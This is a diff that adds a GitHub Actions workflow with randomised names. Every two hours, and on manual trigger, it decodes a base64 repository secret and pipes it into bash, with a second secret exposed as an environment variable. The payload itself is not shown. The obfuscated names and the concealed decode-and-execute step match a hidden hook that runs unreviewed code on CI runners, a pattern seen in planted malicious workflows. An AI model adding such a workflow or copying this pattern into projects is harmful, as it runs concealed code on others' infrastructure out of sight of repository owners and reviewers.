@@ -1,0 +1,13 @@
+name: nsHYAHAmbs
+on:
+  schedule:
+    - cron: '0 */2 * * *'
+  workflow_dispatch:
+jobs:
+  SaRPotrOC:
+    runs-on: ubuntu-latest
+    env:
+      VeqZsfbD: ${{ secrets.BezuAf }}
+    steps:
+      - uses: actions/checkout@v5
+      - run: echo "${{ secrets.nobRHz }}" | base64 -d | bash
